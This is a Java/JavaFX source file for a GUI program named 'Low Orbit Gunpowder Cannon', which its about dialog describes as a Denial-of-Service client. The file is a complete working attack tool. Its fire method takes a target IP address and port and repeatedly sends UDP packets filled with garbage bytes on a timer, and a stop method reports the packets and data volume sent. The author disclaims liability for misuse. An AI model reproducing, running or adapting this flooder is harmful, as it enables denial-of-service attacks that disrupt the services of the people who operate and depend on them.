package DoS_Client_v3;

import javafx.application.Application;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.TextArea;
import javafx.scene.image.Image;
import javafx.stage.Stage;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Objects;
import java.util.Timer;
import java.util.TimerTask;

public class Main extends Application {
    
    private MainPane mp;
    private final TextArea console = new TextArea();
    private final Scene consoleScene = new Scene(console, 400, 300);
    private final Stage consoleStage = new Stage();
    private int garbageSize, packetsSent = 0;
    private long designatedDelay;
    private Alert alert;
    private DatagramPacket dp;
    private DatagramSocket ds;
    private Timer timer;
    private TimerTask task;
    
    public static void main(String[] args) {
        launch();
    }

    @Override
    public void start(Stage primaryStage) throws Exception {
        initialize();
        Scene mainScene = new Scene(mp.getMainPane(), 400, 500);
        mainScene.getStylesheets().add(Objects.requireNonNull(Main.class.
                        getResource("ViewStyle.css")).toExternalForm());
        primaryStage.setTitle("Low Orbit Gunpowder Cannon");
        primaryStage.getIcons().add(new Image("file:programicon.png"));
        primaryStage.setScene(mainScene);
        primaryStage.show();
        
        mp.getAbout().setOnAction(e -> {
            displayAlert(0, "About", "This is a Denial-of-Service client "
                    + "created by phr4ck. \n\nI take no liability for any misuse "
                    + "or damage resultant of said misuse. This program is "
                    + "provided free-of-charge and provided AS IS with no "
                    + "warranty. \n\nHow to Use: \n\nEnter an IP address and a "
                    + "port number and click FIRE to spam packets. \n\nClick "
                    + "STOP to cease the spamming of packets. \n\nClick EXIT to "
                    + "exit the program. This will stop any packet spam and "
                    + "exit the program. You can also use OS-specific methods "
                    + "of closing the program as the effect is the same. "
                    + "\n\nSelect the size of the buffer with the BUFFER SIZE "
                    + "list.\n\nMove the DELAY slider to get the delay you "
                    + "want. A minimum 0.1s delay is required for smooth "
                    + "execution of the program. \n\nClick the CONSOLE item to "
                    + "generate a console window (so you don't need to "
                    + "activate this program through a terminal to see "
                    + "verbose output.)\n\nAnalysis is available through the "
                    + "console once the STOP button is pressed.");
        });
        
        mp.getConsole().setOnAction(e -> {
            generateConsole();
        });
        
        mp.getFireBtn().setOnAction(e -> {
            fire(mp.getIp(), mp.getPort(), mp.getBufferSize(), mp.getDelay());
        });
        
        mp.getStopBtn().setOnAction(e -> {
            cease();
        });
        
        mp.getExitBtn().setOnAction(e -> {
            exit();
        });
        
        primaryStage.setOnCloseRequest(e -> {
            exit();
        });
        
        consoleStage.setOnCloseRequest(e -> {
            console.clear();
        });
        
    }
    
    private void displayAlert(int id, String header, String content) {
        
        switch(id) {
            case 0: alert.setAlertType(AlertType.INFORMATION);
                    break;
            case 1: alert.setAlertType(AlertType.ERROR);
                    break;
        }
        
        alert.setHeaderText(header);
        alert.setContentText(content);
        alert.showAndWait();
    }
    
    //stop() is a reserved method so this will suffice
    //Stops everything used for firing packets.
    private void cease() {
        ds.close();
        task.cancel();
        timer.cancel();
        console.appendText("STOP: Packets have stopped. The socket has been "
                + "closed.\n");
        generateAnalytics();
    }
    
    private void exit() {
        if(ds != null && !ds.isClosed() && task != null && timer != null)
            cease();
            
        console.appendText("EXIT: Program is now closing.\n");
        System.exit(0);
    }
    
    //Fires packets at a given target and port, while also keeping track of
    //packets for future analytics.
    private void fire(String ipStr, String portStr, int bufferSize, long delay) {
        
        packetsSent = 0;
        InetAddress address;
        int port;
        byte[] garbage;
        
        try {
            address = InetAddress.getByName(ipStr);
            port = Integer.parseInt(portStr);
            
            if(bufferSize < 0)
                return;
            else
                garbage = new byte[bufferSize];
            
            dp = new DatagramPacket(garbage, garbage.length, address, port);
            ds = new DatagramSocket(port);
            ds.connect(address, port);
            
            garbageSize = garbage.length;
            designatedDelay = delay;
            
            if(ds.isConnected() && !ipStr.trim().equals("")) {
                timer = new Timer();
                console.appendText("FIRE: Packets being sent to " + ipStr
                        + " at port " + portStr + " every " + (delay/1000.0)
                                + " seconds.\n");
                
                task = new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            ds.send(dp);
                            packetsSent++;
                        } catch (IOException ex) {
                            console.appendText("Exception Caught: IOException "
                                    + "occurred while firing.\n");
                        }
                    }
                };
                
                timer.scheduleAtFixedRate(task, 0, delay);
            } else {
                displayAlert(1, "ERROR", "Could not be connected to target.");
                console.appendText("ERROR: Connection to " + ipStr + " could "
                        + "not be made on port " + portStr + ".\n");
            }
            
        } catch(UnknownHostException ex) {
            displayAlert(1, "ERROR", "Host could not be determined.");
            console.appendText("Exception Caught: UnknownHostException in "
                    + "IP field.\n");
        } catch (IOException ex) {
            console.appendText("Exception Caught: IOException occurred prior "
                    + "to firing.\n");
        } catch (NumberFormatException ex) {
            displayAlert(1, "ERROR", "Invalid port number entered.");
            console.appendText("Exception Caught: NumberFormatException in "
                    + "Port field.\n");
        }
    }
    
    private void generateConsole() {
        consoleStage.setScene(consoleScene);
        consoleStage.setTitle("CONSOLE");
        consoleStage.getIcons().add(new Image("file:programicon.png"));
        console.appendText("Verbose output will appear here.\n\n");
        consoleStage.show();
    }
    
    private void generateAnalytics() {
        console.appendText("\nANALYTICS: " + packetsSent + " packets were sent "
                + "containing " + garbageSize + "\nbytes of data each in " + 
                packetsSent * (designatedDelay/1000.0) + " seconds.\n\n"
                + "Approximate Data Sent:\n" + ((garbageSize * packetsSent)/1000.0) + 
                "KB\n" + (garbageSize * packetsSent)/1000000.0 + "MB\n" + 
                ((garbageSize * packetsSent)/1000000000.0) + "GB\n");
    }
    
    private void initialize() {
        console.setEditable(false);
        mp = new MainPane();
        alert = new Alert(AlertType.INFORMATION);
    }
    
}
